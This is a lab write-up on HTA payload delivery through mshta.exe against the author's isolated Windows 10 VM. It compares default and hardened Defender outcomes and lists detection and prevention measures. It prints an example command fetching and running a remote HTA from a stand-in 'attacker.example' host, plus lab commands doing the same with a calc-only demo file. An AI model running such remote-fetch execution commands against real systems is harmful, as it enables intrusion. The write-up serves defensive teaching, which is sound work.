# Practical 3 — HTA Payload Delivery against Windows

> **Format: lab writeup.** Performed against my own Windows 10 VM on an
> isolated host-only network. See [`../README.md`](../README.md) for
> scope.

---

## 1. Objective

Use the HTA attack pattern to demonstrate how `mshta.exe` — a built-in,
signed, trusted Windows binary — can execute attacker-supplied script
from a remote URL, and how modern Windows defences (AMSI, ASR rules,
SmartScreen, Defender behavioural detection, AppLocker / WDAC) catch or
block it.

---

## 2. Background

### What an HTA is
HTML Application — a `.hta` file. Looks like an HTML document, executes
as a trusted local application via `mshta.exe`. Has full access to the
user's filesystem, network, and ability to spawn processes — none of
the sandboxing a browser applies to ordinary HTML.

### Why it's an attack pattern
- **Mshta is signed by Microsoft.** Plain allowlists that trust signed
  Microsoft binaries let it run. Mshta is in MITRE ATT&CK as **T1218.005
  — Signed Binary Proxy Execution: Mshta**.
- **It can fetch and execute remote content** with one command:
  `mshta.exe https://attacker.example/payload.hta`.
- **The script inside can call PowerShell, WScript, or instantiate COM
  objects** — full execution context.
- **The lure surface is wide.** A `.hta` linked from a phishing email,
  dropped by a macro, or staged on a compromised intranet share all hit
  the same primitive.

### Where it sits in a kill chain
HTA is **initial execution**, not initial access — something has to put
the HTA file path in front of the user (phishing link, malicious
attachment, compromised internal page). In SET, the HTA module pairs a
generator with a hosted listener so the whole chain runs from one menu.
For lab purposes I treat the hosting and the execution as separate
steps and only run the *execution* on a VM I own.

---

## 3. Lab Procedure

### 3.1 Lab additions

| Role        | OS                | IP              | Notes |
|-------------|-------------------|-----------------|-------|
| Attacker    | Kali Linux        | 192.168.56.10   | Hosts a static HTA on `python3 -m http.server` |
| Victim      | Windows 10 22H2   | 192.168.56.40   | Defender ON, SmartScreen ON. Fresh snapshot. |

I run two variants of the victim VM from snapshot: **default-Defender**
(out-of-the-box settings) and **hardened** (ASR rules + Smart App
Control + AppLocker policy applied). The whole point is to compare
outcomes.

### 3.2 The HTA used in the lab

A minimal proof-of-execution HTA — *not* a real payload. It only opens
the calculator, which is the canonical "did execution happen" signal
because calc.exe is harmless and unmistakable in Process Monitor.

```html
<!-- demo.hta -->
<html>
<head><title>Lab HTA</title>
<HTA:APPLICATION ID="LabHTA" APPLICATIONNAME="LabHTA" />
</head>
<body>
<script language="VBScript">
  Set sh = CreateObject("WScript.Shell")
  sh.Run "calc.exe"
  Self.Close()
</script>
</body>
</html>
```

That's the whole file. No download cradle, no PowerShell, no LOLBin
chaining. The exercise is about *whether execution happens at all and
what catches it* — not about building a real payload.

### 3.3 Hosting (lab-internal only)

On the attacker VM:
```bash
mkdir /tmp/labhost && cd /tmp/labhost
cp ~/demo.hta .
sudo python3 -m http.server 80
```

### 3.4 Execution from the victim VM

On the Windows 10 victim, **as an exercise to test defences**, I run
each of these from a screenshot-logged session and record what happens.
Each is run interactively at an elevated PowerShell so behaviour is
unambiguous:

```powershell
# 1. Direct mshta invocation
mshta.exe http://192.168.56.10/demo.hta

# 2. Same via cmd /c (a common phishing-doc pattern)
cmd /c mshta http://192.168.56.10/demo.hta

# 3. Double-click the file from File Explorer after downloading via Edge
```

### 3.5 Observed outcomes

**Default-Defender VM:**

| Trigger | Outcome |
|---|---|
| Direct `mshta.exe http://...` | Execution occurs; calc opens. Defender logs the network fetch but does not block by default. |
| `cmd /c mshta ...` from non-interactive parent | If parent is Office / Outlook, **ASR rule "Block Office applications from creating child processes"** (when enabled) prevents it. Bare cmd → executes. |
| Double-click downloaded `.hta` | SmartScreen warning on first run for files with MOTW; user must explicitly click through. |

**Hardened VM:**

| Trigger | Outcome |
|---|---|
| Direct `mshta.exe ...` | Blocked by AppLocker rule denying `mshta.exe`. Event `8004` in `Microsoft-Windows-AppLocker/EXE and DLL`. |
| `cmd /c mshta ...` | Same — AppLocker catches the resolved binary. |
| Double-click `.hta` | Smart App Control blocks unsigned HTA from running, no override path for the user. |

Plus: Defender's behavioural engine logs the `mshta.exe` → `calc.exe`
parent-child sequence under "Suspicious behavior by Mshta.exe" in the
Defender Operations log, regardless of whether execution succeeded.

### 3.6 Cleanup
```powershell
# Victim
Get-Process calc -ErrorAction SilentlyContinue | Stop-Process
```
Restore the victim VM snapshot. Stop the attacker's HTTP server.

---

## 4. Detection

| Signal | Where to look |
|---|---|
| `mshta.exe` with a remote URL on the command line | EDR command-line logging (`Sysmon Event ID 1`, Defender XDR) |
| `mshta.exe` parent-child with `powershell.exe`, `wscript.exe`, `cmd.exe` | Sysmon process tree, Defender ASR audit logs |
| `mshta.exe` initiating outbound HTTP to a non-standard host | EDR network telemetry, proxy logs |
| `.hta` files with MOTW (Mark-of-the-Web) being opened | Defender SmartScreen telemetry |
| AppLocker / WDAC deny events for mshta | `Microsoft-Windows-AppLocker/*` event log |

Sysmon with a community config (SwiftOnSecurity / Olaf Hartong) is the
single best lab tool for visualising this — every step shows up as a
discrete event you can correlate.

---

## 5. Prevention

### Block the primitive
- **ASR rule: "Block all Office applications from creating child
  processes"** (`D4F940AB-401B-4EFC-AADC-AD5F3C50688A`).
- **ASR rule: "Block execution of potentially obfuscated scripts"**.
- **AppLocker / WDAC** denying `mshta.exe` for non-admin users where
  it isn't needed (most environments).
- **Smart App Control** on Windows 11 — blocks unsigned and low-reputation
  files including HTAs by default.

### Reduce the attack surface
- **Disable HTA file association** for end-users via GPO (`.hta` →
  Notepad rather than mshta).
- **Mark-of-the-Web propagation** — ensure compressed-file extractors
  preserve MOTW so SmartScreen fires on extracted HTAs.
- **Office macro restrictions** — block macros from the internet
  (default since 2022). Cuts off the most common HTA delivery path.

### Reduce the delivery surface
- **Mail-filter detonation** of `.hta` and links that resolve to
  `.hta`.
- **Block `.hta` at the mail gateway** outright — there is no business
  reason for end-users to receive HTAs by email.
- **Proxy / web filter** category-blocks for risky file types and
  newly-registered domains.

### Identity / privilege
- **Local admin removal** for end-users. Most HTA payload effects need
  admin to persist; without it, the blast radius shrinks.
- **LAPS** for the local-admin password where local admin is unavoidable.

---

## 6. Modern Relevance

HTAs are an old technique (Internet Explorer 5 era), but the
*signed-binary-proxy-execution* pattern they instantiate is still very
much in use — Bumblebee, IcedID, and various commodity loaders have all
shipped HTA stages in the last few years because mshta.exe is everywhere,
signed, and rarely watched. The defensive answer is the same one that
applies to LOLBin abuse in general: **command-line telemetry +
behavioural detection + a deny-by-default execution policy** for the
binaries no end-user needs.

For a lab, HTA is an unusually clean teaching example: small, signed,
trivially reproducible, and lights up every layer of the modern Windows
defence stack distinctly.

---

## 7. References

- MITRE ATT&CK T1218.005 — Signed Binary Proxy Execution: Mshta
- Microsoft Learn — *Attack Surface Reduction rules reference*
- Microsoft Learn — *Smart App Control*
- Microsoft Learn — *AppLocker* / *Windows Defender Application Control*
- Sysmon — https://learn.microsoft.com/sysinternals/downloads/sysmon
- SwiftOnSecurity Sysmon config — https://github.com/SwiftOnSecurity/sysmon-config
- LOLBAS project entry: mshta — https://lolbas-project.github.io/lolbas/Binaries/Mshta/
